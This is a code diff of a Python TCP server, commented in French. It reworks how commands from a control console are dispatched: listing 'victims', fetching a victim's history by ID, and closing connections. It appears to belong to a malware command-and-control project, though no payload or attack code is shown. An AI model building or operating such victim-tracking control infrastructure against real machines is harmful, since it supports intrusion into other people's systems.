@@ -16,9 +16,9 @@ from _thread import start_new_thread
 
 import configgetter as config
 import security
-import os
+import json
 import utile.data as udata
-
+import message
 
 # --------------------------------------------
 # Classes & Functions
@@ -65,26 +65,23 @@ class server_tcp(object):
 
 
 
-    def gestion_msg(self, c,message):
+    def gestion_msg(self, c,msg):
         """
         Système de gestion des commandes envoyées par la console de contrôle
         """
-        if message == '1':
+        if msg == message.list_victim_req():
             # On va interroger le serveur SQL depuis le serveur frontale pour des raisons
             # De sécurité...
             # On envoie la liste
             return udata.list_victim()
-        elif message == '2':
+        elif "HIST_REQ" in msg:
             # On demande un ID en particulier pour une recherche d'historique
-            c.send(bytes('Please provide an user ID for the history', 'utf-8'))
-            # On attends l'ID en écoutant sur le serveur frontale
-            id = c.recv(2048).decode()
             # On envoie l'historique
-            return udata.history_req(id)
-        elif message == '3':
+            return udata.history_req(msg[-3:-2])
+        elif msg == '3':
             # C'est à faire
             return "Todo3"
-        elif message == '4':
+        elif msg == message.close_connexion():
             return 'Thanks you, good bye.'
 
     def threaded(self, c, sc):
